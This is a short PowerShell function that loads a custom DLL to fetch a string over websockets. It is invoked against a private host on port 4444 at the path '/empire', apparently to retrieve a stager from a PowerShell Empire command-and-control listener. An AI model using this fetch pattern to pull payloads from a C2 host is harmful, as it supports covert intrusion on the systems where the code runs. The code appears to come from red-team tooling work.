## wsGetString Function:

function  wsGetString
{

<#

.SYNOPSIS

    Copies a string from url using websockets 

.PARAMETER url

    Specifies the path to the file to copy.

.OUTPUTS

    A string.

.EXAMPLE

   wsGetString "192.168.25.33:4444/empire"

#>
    [CmdletBinding()]
    [OutputType([String])]

    Param (
        [Parameter(Mandatory = $True, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $url
    )

    $MethodDefinition = @’
    [DllImport("c:\\Users\\bill\\Desktop\\pse_wsclient\\Debug\\wscli32.dll")]
    public static extern string getstring(string pUrl);
‘@
    $wscli32 = Add-Type -MemberDefinition $MethodDefinition -Name ‘wscli32’ -Namespace ‘Win32’ -PassThru

    # Perform the 
    $Result = $wscli32::getstring($url)

    return $Result
}

wsGetString -url "172.16.155.1:4444/empire" 


